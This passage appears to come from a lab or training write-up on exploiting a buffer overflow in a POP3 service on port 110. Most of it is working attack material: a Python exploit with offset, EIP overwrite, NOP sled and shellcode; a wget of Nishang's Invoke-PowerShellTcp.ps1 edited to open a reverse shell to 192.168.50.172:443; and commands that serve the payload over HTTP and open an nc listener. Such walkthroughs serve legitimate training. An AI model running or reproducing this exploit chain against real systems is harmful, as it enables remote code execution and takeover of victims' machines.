"\x0f\xc6\x6a\x8f\x3f\xaf\x5b\x04\xd0\xa8\x63\xcf\x94\x57"
"\x86\xc5\xe0\xff\x1f\x8c\x48\x62\xa0\x7b\x8e\x9b\x23\x89"
"\x6f\x58\x3b\xf8\x6a\x24\xfb\x11\x07\x35\x6e\x15\xb4\x36"
"\xbb\x65\x55\xbe\x21\xf7\xda\x28\xcf\x9b\x70\x89\x46\x26"
"\xd1\xe1\x16\xcd\x96\xdc\xe9\x6f\x33\x7a\x95\x1b\xe3\xca"
"\x3c\x97\xcd\x85\xdb\x35\x51\x46\x4d\xdc\x3b\xe2\xa4\x30"
"\xa0\x65\xc0\x22\x44\x15\x4f\xde\xc7\x9d\xfd\x77\x86\x3a"
"\x2a\xa0\x3e\xb1\x5e\xde\x84\x16\xb0\x2f\xc0\x5a\xe0\x7e"
"\x04\xa3\xd2\xb5\x58\xfd\x1b\x82\xaa\x2e\x0c\xbf\xe4\x40"
"\xdf\x0e\xde\x89\x1f"
```

In this case, the *payload* will download a *PS.ps1* file that we will be sharing with a *Python* server. To download the script we can download the following resource and rename it to *PS.ps1*:

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

mv Invoke-PowerShellTcp.ps1 PS.ps1
```

To set the *reverse shell* directly, we must open the *PS.ps1* file and add the following line at the end with our *IP* and the desired *port*:

```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.172 -Port 443
```

We add the above shellcode to our *exploit.py* script:

```python
#!/usr/bin/python3

import socket
from struct import pack

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4a358f)
shell_code = (b"\xd9\xc5\xd9\x74\x24\xf4\x5d\xbe\x22\x9f\xd1\xb8\x29\xc9"
b"\xb1\x45\x31\x75\x17\x83\xed\xfc\x03\x57\x8c\x33\x4d\x6b"
b"\x5a\x31\xae\x93\x9b\x56\x26\x76\xaa\x56\x5c\xf3\x9d\x66"
b"\x16\x51\x12\x0c\x7a\x41\xa1\x60\x53\x66\x02\xce\x85\x49"
b"\x93\x63\xf5\xc8\x17\x7e\x2a\x2a\x29\xb1\x3f\x2b\x6e\xac"
b"\xb2\x79\x27\xba\x61\x6d\x4c\xf6\xb9\x06\x1e\x16\xba\xfb"
b"\xd7\x19\xeb\xaa\x6c\x40\x2b\x4d\xa0\xf8\x62\x55\xa5\xc5"
b"\x3d\xee\x1d\xb1\xbf\x26\x6c\x3a\x13\x07\x40\xc9\x6d\x40"
b"\x67\x32\x18\xb8\x9b\xcf\x1b\x7f\xe1\x0b\xa9\x9b\x41\xdf"
b"\x09\x47\x73\x0c\xcf\x0c\x7f\xf9\x9b\x4a\x9c\xfc\x48\xe1"
b"\x98\x75\x6f\x25\x29\xcd\x54\xe1\x71\x95\xf5\xb0\xdf\x78"
b"\x09\xa2\xbf\x25\xaf\xa9\x52\x31\xc2\xf0\x38\xc4\x50\x8f"
b"\x0f\xc6\x6a\x8f\x3f\xaf\x5b\x04\xd0\xa8\x63\xcf\x94\x57"
b"\x86\xc5\xe0\xff\x1f\x8c\x48\x62\xa0\x7b\x8e\x9b\x23\x89"
b"\x6f\x58\x3b\xf8\x6a\x24\xfb\x11\x07\x35\x6e\x15\xb4\x36"
b"\xbb\x65\x55\xbe\x21\xf7\xda\x28\xcf\x9b\x70\x89\x46\x26"
b"\xd1\xe1\x16\xcd\x96\xdc\xe9\x6f\x33\x7a\x95\x1b\xe3\xca"
b"\x3c\x97\xcd\x85\xdb\x35\x51\x46\x4d\xdc\x3b\xe2\xa4\x30"
b"\xa0\x65\xc0\x22\x44\x15\x4f\xde\xc7\x9d\xfd\x77\x86\x3a"
b"\x2a\xa0\x3e\xb1\x5e\xde\x84\x16\xb0\x2f\xc0\x5a\xe0\x7e"
b"\x04\xa3\xd2\xb5\x58\xfd\x1b\x82\xaa\x2e\x0c\xbf\xe4\x40"
b"\xdf\x0e\xde\x89\x1f")

payload = before_eip + eip + b"\x90"*32 + shell_code

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

Now we can share our resource with *Python*, leave port *443* listening and run our script to gain access (this time with a *PoweShell* console) to the victim machine:

```bash
python3 -m http.server 80

rlwrap nc -nlvp 443

python3 exploit.py
```